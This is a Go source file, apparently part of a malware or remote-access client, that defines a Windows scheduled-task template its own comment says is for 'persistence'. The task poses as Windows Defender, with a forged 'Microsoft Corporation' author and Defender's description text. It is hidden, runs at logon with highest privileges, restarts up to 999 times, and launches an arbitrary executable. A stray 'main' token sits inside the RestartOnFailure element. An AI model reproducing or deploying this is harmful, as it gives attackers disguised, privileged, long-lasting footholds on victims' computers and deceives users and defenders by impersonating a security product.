package client

import "os"

// schtask is needed for scheduled task persistence
var schtask = `<?xml version="1.0" encoding="UTF-16"?>

<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Keep your PC safe with trusted antivirus protection built-in to Windows 10. Windows Defender Antivirus delivers comprehensive, ongoing and real-time protection against software threats like viruses, malware and spyware across email, apps, the cloud and the web.
    </Description>
    <URI>\\WindowsDefender</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </LogonTrigger>
  </Triggers>

  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>

  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>2</Priority>
    <RestartOnFailure>main
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>

  <Actions Context="Author">
    <Exec>
      <Command>` + PathExe + `</Command>
      <WorkingDirectory>` + os.ExpandEnv("~") + `</WorkingDirectory>
    </Exec>
  </Actions>
</Task>`
